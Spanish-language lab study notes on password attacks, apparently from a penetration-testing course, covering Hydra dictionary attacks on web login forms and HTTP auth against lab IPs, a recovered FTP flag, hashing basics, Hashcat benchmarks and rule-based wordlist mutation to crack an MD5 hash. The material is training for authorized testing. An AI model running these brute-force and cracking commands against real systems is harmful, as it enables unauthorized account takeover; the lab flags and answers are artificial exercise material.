+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||53086|)
+150 Starting data transfer.
+-rw-rw-rw- 1 ftp ftp             282 Jun 09  2022 desktop.ini
+-rw-rw-rw- 1 ftp ftp              38 Apr 26 10:39 flag.txt
+226 Operation successful
+ftp&gt; more flag.txt
+OS{ac433a169010f42c90113d0a68e6c253}
+
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>HTTP POST Login Form</strong></p>
+
+<p>Cuando tenemos un portal de logeo en una aplicación web</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230426133812.png" text-align="center" />
+</div>
+
+<p>Podemos realizar un ataque de lista de diccionario con Hydra a través del módulo HTTP-POST-FORM. Este, además de los parámetros habituales, consta de uno que se divide en tres partes, la página de logeo, los parámetros de la request y un mensaje característico de un intento de logeo fallido de la página web. Un ejempl sería:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid"
+...
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://192.168.50.201:80/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid username or password
+</code></pre></div></div>
+
+<p>El comando anterior manda las requests a la página /index.php, pasa en la reuqest POST los parámetros fm_user y fm_pass (observemos que el valor de aquel parámetro sobre el que se utiliza una lista de candidatos es ‘^PASS^’ o ‘^USER^’) y sabe si la petición de logeo ha sido exitosa cuando no detecta el string ‘Login Invalid’ en la respuesta.</p>
+
+<p>Los dos primeros parámetros se pueden obtener o bien capturando una request en burpsuite o utilizando DevTools y acudiendo a la sección Network y revisando las distintas secciones de la request de logeo (cookies, parameter, etc):</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230426134625.png" text-align="center" />
+</div>
+
+<p>La segunda simplemente realizando un logeo de test y revisando la respuesta del navegador:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230426134654.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>Exercises</strong></p>
+
+<p><strong>1. Follow the steps from this section to gain access to TinyFileManager on VM #1 (BRUTE). Once logged in, find the flag.</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.240.201 http-post-form "/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid"
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-26 11:59:32
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://192.168.240.201:80/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid
+[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 16 active
+[80][http-post-form] host: 192.168.240.201   login: user   password: 121212
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-26 12:01:59
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>2. The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user admin. Once you have identified the correct password, enter it as answer to this exercise.</strong></p>
+
+<p>Acudimos a la aplicación web y observamos que antes de que podamos acceder salta una ventana pidiendo credenciales:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230426181152.png" text-align="center" />
+</div>
+
+<p>Utilizamos el módulo http-get de hydra:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.240.201 http-get 
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-26 12:05:35
+[WARNING] You must supply the web page as an additional option or via -m, default path set to /
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-get://192.168.240.201:80/
+[80][http-get] host: 192.168.240.201   login: admin   password: 789456
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-26 12:05:48
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h3 id="212-password-cracking-fundamentals">21.2. Password Cracking Fundamentals.</h3>
+
+<h4 id="2121-encription-vs-hash">21.2.1 Encription vs Hash.</h4>
+
+<p>En esta sección, examinaremos las diferencias entre el <em>cifrado</em> y los <em>algoritmos hash</em> y analizaremos el crakeo de contraseñas. Luego, revisaremos dos herramientas populares para descifrar contraseñas: <em>Hashcat</em> y <em>John the Ripper</em> (JtR). Finalmente, calcularemos el tiempo que toma descifrar ciertos hashes.</p>
+
+<p>Para comenzar, analicemos los conceptos básicos del cifrado. El cifrado es una función bidireccional, en la que los datos se “codifican” (cifran) o “descifran” (descifran) con al menos una clave. Los datos cifrados se conocen como <em>texto cifrado</em> o <em>cipher text</em>.</p>
+
+<p>Los algoritmos de cifrado <em>simétrico</em> utilizan la misma clave tanto para el cifrado como para el descifrado. Para enviar un mensaje a otra persona, ambas partes deben conocer la clave (contraseña). Si intercambian la clave a través de un canal no seguro, un atacante puede interceptarla. Además, el atacante puede usar un ataque <em>Man-in-the-middle</em> para obtener acceso a los mensajes cifrados enviados entre los socios de comunicación. Tanto con la clave interceptada como con el acceso a los mensajes cifrados, el atacante puede descifrarlos y leerlos. Esto crea un gran riesgo de seguridad ya que toda la seguridad de la comunicación se basa en el conocimiento de una clave, que ambas partes deben conocer antes de iniciar la comunicación. El estándar de cifrado avanzado (AES) es un ejemplo de un algoritmo de cifrado simétrico.</p>
+
+<p>El cifrado <em>asimétrico</em> utiliza pares de claves distintas que contienen claves públicas y privadas. Cada usuario en esta transacción tiene su propio par de claves. Para recibir un mensaje cifrado, un usuario proporciona su clave pública al socio de comunicación, que utiliza para cifrar su mensaje para nosotros. Cuando se envía el mensaje, solo la clave privada correspondiente puede descifrar el mensaje. Un algoritmo de cifrado asimétrico común es Rivest-Shamir-Adleman (RSA).</p>
+
+<p>Por otro lado, un hash (o resumen) es el resultado de ejecutar datos de entrada de tamaño variable (en este caso, una contraseña de texto sin formato) a través de un algoritmo hash (como SHA1 o MD5 12).</p>
+
+<p>El resultado es un valor hexadecimal de longitud fija prácticamente único que representa el texto sin formato original. En otras palabras, el texto sin formato que se ejecuta a través de un algoritmo hash específico siempre produce el mismo hash y el hash resultante es (estadísticamente) único. La única excepción a esto es la extremadamente rara <em>colisión</em> en la que dos valores de entrada dan como resultado el mismo valor de hash. La principal diferencia por tanto entre la codificación/cifrado y el hash es que en la codificación los datos están completos, integros, pero transformados de forma que resultan ilegibles</p>
+
+<p>La mayoría de los algoritmos hash de uso común, como MD5 y SHA1, son <em>funciones hash criptográficas</em>. Estos algoritmos hash son <em>funciones unidireccionales</em>, lo que significa que es trivial generar un hash, pero la implementación adecuada de un algoritmo hace prohibitivamente difícil obtener el texto sin formato del hash. Para este módulo, analizaremos las funciones hash criptográficas a menos que se indique lo contrario.</p>
+
+<p>El hashing a menudo se aprovecha en el campo de la seguridad de la información. Por ejemplo, si un usuario registra una cuenta a través de una aplicación, establece una contraseña. La contraseña a menudo se hashea y se almacena en una base de datos para que los administradores del sitio (y los atacantes) no puedan acceder a la contraseña de texto sin formato.</p>
+
+<p>Cuando se realiza un intento de inicio de sesión, la contraseña ingresada se convierte en hash y ese hash se compara con el valor hash en la base de datos. Si coinciden, la contraseña ingresada es correcta y el usuario inicia sesión.</p>
+
+<p>Dentro del alcance de los ataques de contraseña, las contraseñas de aplicaciones y usuarios a menudo se cifran o se cifran para protegerlas.</p>
+
+<p>Para descifrar una contraseña cifrada debemos determinar la clave utilizada para cifrarla. Para determinar el texto sin formato de una contraseña con hash, debemos ejecutar varias contraseñas de texto sin formato a través del algoritmo hash y comparar el hash devuelto con el hash de destino. Estos ataques se conocen colectivamente como <em>password cracking</em> y, a menudo, se realizan en un sistema dedicado. Dado que el proceso puede llevar una cantidad de tiempo considerable, a menudo lo ejecutamos en paralelo con otras actividades durante una prueba de penetración.</p>
+
+<p>A diferencia de los ataques de diccionario básicos contra los servicios de red y los formularios de inicio de sesión que se demostraron en la Unidad de aprendizaje anterior, el descifrado de contraseñas conserva el ancho de banda de la red, no bloquea las cuentas y no se ve afectado por las tecnologías defensivas tradicionales.</p>
+
+<p>Podemos realizar un descifrado básico de contraseñas con un ejemplo simple. Supongamos que obtuvimos acceso a un hash de contraseña SHA-256 de 5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6_ . Hay varias formas en que podríamos haber obtenido acceso a este hash, pero de cualquier manera podemos usar <strong>sha256sum</strong> para codificar varias contraseñas y examinar los resultados. En este caso, haremos hash de la cadena “secret”, luego haremos hash de “secret” nuevamente y finalmente haremos hash de la cadena “secret1”. Usaremos <strong>echo -n</strong> para eliminar la nueva línea de nuestra cadena (que se habría agregado a nuestra cadena, modificando el hash).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ echo -n "secret" | sha256sum
+2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -
+
+kali@kali:~$ echo -n "secret" | sha256sum
+2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -
+
+kali@kali:~$ echo -n "secret1" | sha256sum
+5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6  -
+</code></pre></div></div>
+
+<p>En este ejemplo, aplicamos el hash “secreto” dos veces para mostrar que el hash de salida resultante es siempre el mismo. Tenga en cuenta que los valores hash para “secreto” y “secreto1” son completamente diferentes aunque las cadenas de entrada sean similares. También tenga en cuenta que el hash de “secret1” coincide con nuestro hash capturado. Esto significa que hemos determinado la contraseña de texto sin formato (“secret1”) asociada con ese hash. </p>
+
+<p>Sin embargo, esta es una forma muy simple e incómoda de descifrar hashes de contraseñas. Afortunadamente, hay herramientas mucho mejores disponibles. Hashcat y John the Ripper (JtR) son dos de las herramientas más populares para descifrar contraseñas. En general, JtR es más una herramienta de craqueo basada en CPU, que también admite GPU, mientras que Hashcat es principalmente una herramienta de craqueo basada en GPU que también admite CPU. JtR se puede ejecutar sin ningún controlador adicional usando solo CPU para descifrar contraseñas. Hashcat requiere <em>OpenCL</em> o <em>CUDA</em> para el proceso de craqueo de GPU. Para la mayoría de los algoritmos, una GPU es mucho más rápida que una CPU, ya que las GPU modernas contienen miles de núcleos, cada uno de los cuales puede compartir parte de la carga de trabajo. Sin embargo, algunos algoritmos hash lentos (como <em>bcrypt</em>) funcionan mejor en las CPU.</p>
+
+<p>Es importante familiarizarse con diferentes herramientas ya que no admiten los mismos algoritmos. Examinaremos ambas herramientas en este Módulo.</p>
+
+<p>Antes de comenzar a descifrar contraseñas, calculemos el tiempo de descifrado de varias representaciones hash. El tiempo de craqueo se puede calcular dividiendo el <em>keyspace</em> con la tasa de hash.</p>
+
+<p>El keyspace consta del conjunto de caracteres posibles elevado a la potencia de la cantidad de caracteres o la longitud de la información original (contraseña). Por ejemplo, si usamos el alfabeto latino en minúsculas (26 caracteres), el alfabeto en mayúsculas (26 caracteres) y los números del 0 al 9 (10 caracteres), tenemos un conjunto de caracteres de 62 variaciones posibles para cada carácter. Si nos encontramos ante una contraseña de cinco caracteres, nos encontramos ante 62 elevado a cinco posibles contraseñas que contengan estos cinco caracteres.</p>
+
+<p>Dado que es importante poder calcular esto, usemos una terminal para calcular el espacio de claves para una contraseña de cinco caracteres haciendo eco de nuestro conjunto de caracteres a wc con -c para contar cada carácter. Nuevamente especificaremos -n para que el comando echo elimine el carácter de nueva línea. Luego podemos usar <em>python3</em> para el cálculo, con -c para ejecutar el cálculo e imprimir para mostrar el resultado.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
+62
+
+kali@kali:~$ python3 -c "print(62**5)"
+916132832
+</code></pre></div></div>
+
+<p>Para una contraseña de cinco caracteres y el conjunto de caracteres especificado, tenemos un espacio de claves de 916.132.832. Este número determina cuántas variaciones únicas se pueden generar para una contraseña de cinco caracteres con este juego de caracteres. Ahora que tenemos el espacio de claves en el contexto de este ejemplo, también necesitamos la tasa de hash para calcular el tiempo de craqueo. La tasa de hash es una medida de cuántos cálculos de hash se pueden realizar en un segundo.</p>
+
+<p>Para encontrar la tasa de hash, podemos usar el modo de referencia de Hashcat para determinar las tasas de hash para varios algoritmos de hash en nuestro hardware particular.</p>
+
+<p>Usaremos <strong>hashcat</strong> con -b para iniciar el “benchmark mode”. Primero, compararemos una CPU ejecutándola en una máquina virtual Kali sin ninguna GPU conectada. Siguiendo un sistema Kali local, los resultados pueden diferir.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ hashcat -b
+hashcat (v6.2.5) starting in benchmark mode
+...
+* Device #1: pthread-Intel(R) Core(TM) i9-10885H CPU @ 2.40GHz, 1545/3154 MB (512 MB allocatable), 4MCU
+
+Benchmark relevant options:
+===========================
+* --optimized-kernel-enable
+
+-------------------
+* Hash-Mode 0 (MD5)
+-------------------
+
+Speed.#1.........:   450.8 MH/s (2.19ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
+
+----------------------
+* Hash-Mode 100 (SHA1)
+----------------------
+
+Speed.#1.........:   298.3 MH/s (3.22ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
+
+---------------------------
+* Hash-Mode 1400 (SHA2-256)
+---------------------------
+
+Speed.#1.........:   134.2 MH/s (7.63ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
+</code></pre></div></div>
+
+<p>El benchmark mode muestra tasas de hash para todos los modos compatibles de Hashcat. La lista anterior está abreviada, ya que Hashcat admite muchos algoritmos hash. Por ahora, solo estamos interesados ​​en MD5, SHA1 y SHA-256. Los valores de las tasas de hash están en MH/s, en los que 1 MH/s equivale a 1 000 000 de hash por segundo. Tenga en cuenta que los resultados variarán en diferentes hardware. Anotemos las tasas de hash que se muestran en el punto de referencia de la CPU en este Listado y ejecutemos un punto de referencia de la GPU para que podamos comparar los resultados.</p>
+
+<p>Para el siguiente punto de referencia, usaremos un sistema diferente con una GPU adjunta. Nuevamente, usaremos el modo de referencia de Hashcat para calcular las tasas de hash para MD5, SHA1 y SHA-256.</p>
+
+<p>No se puede ejecutar una prueba comparativa de GPU en el laboratorio.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\admin\Downloads\hashcat-6.2.5&gt;hashcat.exe -b
+hashcat (v6.2.5) starting in benchmark mode
+...
+* Device #1: NVIDIA GeForce RTX 3090, 23336/24575 MB, 82MCU
+
+Benchmark relevant options:
+===========================
+* --optimized-kernel-enable
+
+-------------------
+* Hash-Mode 0 (MD5)
+-------------------
+
+Speed.#1.........: 68185.1 MH/s (39.99ms) @ Accel:256 Loops:1024 Thr:128 Vec:8
+
+----------------------
+* Hash-Mode 100 (SHA1)
+----------------------
+
+Speed.#1.........: 21528.2 MH/s (63.45ms) @ Accel:64 Loops:512 Thr:512 Vec:1
+
+---------------------------
+* Hash-Mode 1400 (SHA2-256)
+---------------------------
+
+Speed.#1.........:  9276.3 MH/s (73.85ms) @ Accel:16 Loops:1024 Thr:512 Vec:1
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="2122-mutating-wordlists">21.2.2. Mutating Wordlists.</h4>
+
+<p>Las políticas de contraseñas, cuya prevalencia ha aumentado en los últimos años, dictan una longitud mínima de contraseña y el uso de derivaciones de caracteres, incluidas letras mayúsculas y minúsculas, caracteres especiales y valores numéricos.</p>
+
+<p>La mayoría de las contraseñas en las listas de palabras de uso común no cumplirán estos requisitos. Si quisiéramos usarlos contra un objetivo con políticas de contraseñas seguras, tendríamos que preparar manualmente la lista de palabras eliminando todas las contraseñas que no cumplan con la política de contraseñas o modificando manualmente la lista de palabras para incluir las contraseñas adecuadas. Podemos abordar esto automatizando el proceso de cambiar (o <em>mutar</em>) nuestra lista de palabras antes de enviarlas a este objetivo en lo que se conoce como un <em>ataque basado en reglas</em> (Rule-based attacks). En este tipo de ataque, las reglas individuales se implementan a través de funciones de reglas, que se utilizan para modificar contraseñas existentes contenidas en una lista de palabras. Una regla individual consta de una o más funciones de regla. A menudo usaremos varias funciones de regla en cada regla.</p>
+
+<p>Para aprovechar un ataque basado en reglas, crearemos un archivo de reglas que contenga una o más reglas y lo usaremos con una herramienta de craqueo.</p>
+
+<p>En un ejemplo simple, podríamos crear una función de regla que agregue caracteres fijos a todas las contraseñas en una lista de palabras o modifique varios caracteres en una contraseña.</p>
+
+<p>Tenga en cuenta que los ataques basados ​​en reglas aumentan enormemente la cantidad de intentos de contraseñas, aunque ahora sabemos que el hardware moderno puede manejar fácilmente contraseñas comunes con menos de ocho caracteres.</p>
+
+<p>Para el siguiente ejemplo, supondremos que nos enfrentamos a una política de contraseñas que requiere una letra mayúscula, un carácter especial y un valor numérico. Revisemos las primeras 10 contraseñas de <strong>rockyou.txt</strong> para determinar si cumplen con este requisito. Usaremos el comando <strong>head</strong> para mostrar las primeras 10 líneas de la lista de palabras.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ head /usr/share/wordlists/rockyou.txt 
+123456
+12345
+123456789
+password
+iloveyou
+princess
+1234567
+rockyou
+12345678
+abc123
+</code></pre></div></div>
+
+<p>La lista muestra que ninguna de las primeras diez contraseñas de <strong>rockyou.txt</strong> cumple con los requisitos de la política de contraseñas de este ejemplo.</p>
+
+<p>Ahora podríamos usar funciones de reglas para mutar la lista de palabras para que se ajuste a la política de contraseñas. Pero antes de mutar una lista de palabras compleja como <strong>rockyou.txt</strong> , primero familiaricémonos con las funciones de las reglas y cómo usarlas con un ejemplo más básico.</p>
+
+<p>Para demostrar las funciones de las reglas, como el uso de mayúsculas, copiemos las 10 contraseñas del Listado 12 y guárdelas en <strong>demo.txt</strong> en el directorio <strong>passwordattacks</strong> recién creado . Luego, eliminaremos todas las secuencias numéricas (que no se ajustan a la política de contraseñas) de <strong>demo.txt</strong> usando <strong>sed</strong> con <strong>^1</strong> refiriéndose a todas las líneas que comienzan con “1”, eliminándolas con <strong>d</strong> y editando en lugar con <strong>-i</strong> .</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ mkdir passwordattacks
+
+kali@kali:~$ cd passwordattacks
+
+kali@kali:~/passwordattacks$ head /usr/share/wordlists/rockyou.txt &gt; demo.txt
+
+kali@kali:~/passwordattacks$ sed -i '/^1/d' demo.txt 
+
+kali@kali:~/passwordattacks$ cat demo.txt
+password
+iloveyou
+princess
+rockyou
+abc123
+</code></pre></div></div>
+
+<p>Ahora tenemos cinco contraseñas en nuestra lista de palabras <strong>demo.txt</strong> . Modifiquemos estas contraseñas para que se ajusten a la política de contraseñas, que debe incluir un valor numérico, un carácter especial y una letra mayúscula.</p>
+
+<p><a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">Hashcat Wiki</a> proporciona una lista de todas las posibles funciones de reglas con ejemplos. Si queremos agregar un carácter, la forma más simple es anteponerlo o agregarlo. Podemos usar la función <strong>$</strong> para agregar un carácter o <strong>^</strong> para anteponer un carácter. Ambas funciones esperan un carácter después del selector de funciones. Por ejemplo, si queremos anteponer un “3” a cada contraseña en un archivo, la función de regla correspondiente sería <strong>^3</strong> .</p>
+
+<p>Al generar una contraseña con un valor numérico, muchos usuarios simplemente agregan un “1” al final de una contraseña existente. Por lo tanto, creemos un archivo de reglas que contenga <strong>$1</strong> para agregar un “1” a todas las contraseñas en nuestra lista de palabras. Crearemos una <strong>demo.rule</strong> con esta función de regla. Necesitamos escapar del carácter especial “$” para repetirlo en el archivo correctamente.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ echo \$1 &gt; demo.rule
+</code></pre></div></div>
+
+<p>Ahora, podemos usar <strong>hashcat</strong> con nuestra mutación de lista de palabras, proporcionando el archivo de reglas con <strong>-r</strong> y <strong>–stdout</strong> , que inicia Hashcat en modo de depuración. En este modo, Hashcat no intentará descifrar ningún hash, sino que simplemente mostrará las contraseñas mutadas.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ hashcat -r demo.rule --stdout demo.txt
+password1
+iloveyou1
+princess1
+rockyou1
+abc1231
+</code></pre></div></div>
+
+<p>La lista muestra que se agregó un “1” a cada contraseña debido a la función de regla <strong>$1</strong> .</p>
+
+<p>Ahora, abordemos el carácter en mayúsculas de la política de contraseñas. Cuando se les obliga a usar un carácter en mayúsculas en una contraseña, muchos usuarios tienden a escribir en mayúscula el primer carácter. Por lo tanto, agregaremos la función de regla <strong>c</strong> a nuestro archivo de reglas, que pone en mayúscula el primer carácter y convierte el resto en minúsculas.</p>
+
+<p>Probemos un ejemplo usando dos archivos de reglas: <strong>demo1.rule</strong> y <strong>demo2.rule</strong> . Formatearemos estos archivos de manera diferente.</p>
+
+<p>En <strong>demo1.rule</strong> , las funciones de regla están en la misma línea separadas por un espacio. En este caso, Hashcat las usará consecutivamente en cada contraseña de la lista de palabras. El resultado es que el primer carácter de cada contraseña está en mayúscula Y se agrega un “1” a cada contraseña.</p>
+
+<p>En <strong>demo2.rule,</strong> las funciones de la regla están en líneas separadas. Hashcat interpreta la función de la segunda regla, en la segunda línea, como nueva regla. En este caso, cada regla se usa por separado, lo que da como resultado dos contraseñas mutadas para cada contraseña de la lista de palabras.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ cat demo1.rule     
+$1 c
+       
+kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
+Password1
+Iloveyou1
+Princess1
+Rockyou1
+Abc1231
+
+kali@kali:~/passwordattacks$ cat demo2.rule   
+$1
+c
+
+kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
+password1
+Password
+iloveyou1
+Iloveyou
+princess1
+Princess
+...
+</code></pre></div></div>
+
+<p>¡Bien! Hemos adaptado el archivo de reglas <strong>demo1.rule</strong> a dos de las tres políticas de contraseñas. Trabajemos en el tercero y agreguemos un carácter especial. Comenzaremos con “!”, que es un carácter especial muy común.</p>
+
+<p>Con base en esta suposición, ¡agregaremos <strong>$!</strong> a nuestro archivo de reglas. Dado que queremos que todas las funciones de reglas se apliquen a cada contraseña, debemos especificar las funciones en la misma línea. Nuevamente, demostraremos esto con dos archivos de reglas diferentes para enfatizar el concepto de combinar funciones de reglas. En el primer archivo de reglas agregaremos <strong>$!</strong> hasta el final de la primera regla. En el segundo archivo de reglas, lo agregaremos al principio de la regla.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ cat demo1.rule     
+$1 c $!
+
+kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
+Password1!
+Iloveyou1!
+Princess1!
+Rockyou1!
+Abc1231!
+
+kali@kali:~/passwordattacks$ cat demo2.rule   
+$! $1 c
+
+kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
+Password!1
+Iloveyou!1
+Princess!1
+Rockyou!1
+Abc123!1
+</code></pre></div></div>
+
+<p>El resultado muestra que <strong>demo1.rule</strong> muta las contraseñas agregando primero el “1” y luego “!”. El otro archivo de reglas, <strong>demo2.rule</strong> , agrega “!” primero y luego el “1”. Esto nos muestra que las funciones de regla se aplican de izquierda a derecha en una regla.</p>
+
+<p>La regla contenida en <strong>demo1.rule</strong> muta las contraseñas de nuestra lista de palabras para cumplir con los requisitos de la política de contraseñas.</p>
+
+<p>Ahora que tenemos una comprensión básica de las reglas y cómo crearlas, descifremos un hash con un ataque basado en reglas. En esta demostración, supongamos que recuperamos el hash MD5 “f621b6c9eab51a3e2f4e167fee4c6860” de un sistema de destino. Usaremos la lista de palabras <strong>rockyou.txt</strong> y la modificaremos para una política de contraseñas que requiera una letra mayúscula, un valor numérico y un carácter especial.</p>
+
+<p>Vamos a crear un archivo de reglas para abordar esta política de contraseñas. Como antes, usaremos la función de la regla <strong>c</strong> para las mayúsculas de la primera letra. Además, también usamos “!” de nuevo como carácter especial. Para los valores numéricos agregaremos el (siempre popular) “1”, “2” y “123” seguidos del carácter especial.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ cat crackme.txt     
+f621b6c9eab51a3e2f4e167fee4c6860
+
+kali@kali:~/passwordattacks$ cat demo3.rule   
+$1 c $!
+$2 c $!
+$1 $2 $3 c $!
+</code></pre></div></div>
+
+<p>A continuación, podemos ejecutar Hashcat. Deshabilitaremos la depuración eliminando el argumento <strong>–stdout .</strong> En su lugar, especificaremos <strong>-m</strong> , que establece el tipo de hash. En esta demostración, queremos descifrar MD5, que es el tipo de hash <strong>0</strong> , que recuperamos de la página de ejemplos de hash de Hashcat. Después del tipo hash, proporcionaremos el archivo hash MD5 de destino ( <strong>crackme.txt</strong> ) y la lista de palabras <strong>rockyou.txt</strong> . Luego, especificaremos <strong>-r</strong> para proporcionar nuestra <strong>demo3.rule</strong> . Como nuestra máquina virtual Kali no tiene acceso a una GPU, también ingresaremos <strong>–force</strong> para ignorar las advertencias relacionadas de Hashcat.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
+hashcat (v6.2.5) starting
+...
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 43033155
+
+f621b6c9eab51a3e2f4e167fee4c6860:Computer123!            
+                                                          
+Session..........: hashca
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: f621b6c9eab51a3e2f4e167fee4c6860
+Time.Started.....: Tue May 24 14:34:54 2022, (0 secs)
+Time.Estimated...: Tue May 24 14:34:54 2022, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (demo3.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  3144.1 kH/s (0.28ms) @ Accel:256 Loops:3 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+...
+</code></pre></div></div>
+
+<p>En este caso, desciframos el “Computer123!” contraseña, que no estaba incluida en el archivo <strong>rockyou.txt</strong> predeterminado . Esto solo tomó a Hashcat unos segundos a pesar de ejecutarse en la CPU.</p>
+
+<p>Al intentar crear reglas para mutar una lista de palabras existente, siempre debemos considerar el comportamiento humano y la conveniencia con respecto a las contraseñas. La mayoría de los usuarios usan una palabra principal y la modifican para que se ajuste a una política de contraseñas, tal vez agregando números y caracteres especiales. Cuando se requiere una letra mayúscula, la mayoría de los usuarios escriben en mayúscula la primera letra. Cuando se requieren caracteres especiales, la mayoría de los usuarios agregan el carácter especial al final de la contraseña y confían en los caracteres del lado izquierdo del teclado, ya que estos dígitos son fáciles de alcanzar y escribir.</p>
+
+<p>En lugar de crear reglas nosotros mismos, también podemos usar reglas proporcionadas por Hashcat u otras fuentes. Hashcat incluye una variedad de reglas efectivas en <em>/usr/share/hashcat/rules</em>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ ls -la /usr/share/hashcat/rules/
+total 2588
+-rw-r--r-- 1 root root    933 Dec 23 08:53 best64.rule
+-rw-r--r-- 1 root root    666 Dec 23 08:53 combinator.rule
+-rw-r--r-- 1 root root 200188 Dec 23 08:53 d3ad0ne.rule
+-rw-r--r-- 1 root root 788063 Dec 23 08:53 dive.rule
+-rw-r--r-- 1 root root 483425 Dec 23 08:53 generated2.rule
+-rw-r--r-- 1 root root  78068 Dec 23 08:53 generated.rule
+drwxr-xr-x 2 root root   4096 Feb 11 01:58 hybrid
+-rw-r--r-- 1 root root 309439 Dec 23 08:53 Incisive-leetspeak.rule
+-rw-r--r-- 1 root root  35280 Dec 23 08:53 InsidePro-HashManager.rule
+-rw-r--r-- 1 root root  19478 Dec 23 08:53 InsidePro-PasswordsPro.rule
+-rw-r--r-- 1 root root    298 Dec 23 08:53 leetspeak.rule
+-rw-r--r-- 1 root root   1280 Dec 23 08:53 oscommerce.rule
+-rw-r--r-- 1 root root 301161 Dec 23 08:53 rockyou-30000.rule
+-rw-r--r-- 1 root root   1563 Dec 23 08:53 specific.rule
+-rw-r--r-- 1 root root  64068 Dec 23 08:53 T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
+...
+</code></pre></div></div>
+
